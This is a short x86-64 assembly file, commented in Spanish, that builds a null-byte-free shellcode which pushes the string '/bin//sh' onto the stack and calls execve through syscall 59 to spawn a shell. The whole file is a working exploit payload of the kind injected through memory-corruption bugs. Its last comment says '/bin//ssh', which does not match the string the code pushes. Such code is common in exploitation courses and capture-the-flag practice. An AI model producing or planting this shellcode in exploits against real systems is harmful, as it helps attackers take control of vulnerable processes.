; shellcode_in_assembly.asm
global _start
section .text
_start:
  xor rsi,rsi ; Limpiar el registro rsi
  push rsi    ; Guardar en stack NULL bytes
  ; 2f 62 69 6e 2f 2f 73 68 -> /bin//sh
  mov rdi, 0x68732f2f6e69622f
  push rdi    ; Guardar en stack rdi
  push rsp    ; Guardar en stack rsp
  pop rdi     ; Recuperar de stack rdi
  push 59     ; Guardar en stack __NR_execve 
  pop rax     ; Recuperar de stack rax
  cdq         ; Convertir Doubleword to Quadword
  syscall     ; sys_execve('/bin//ssh')
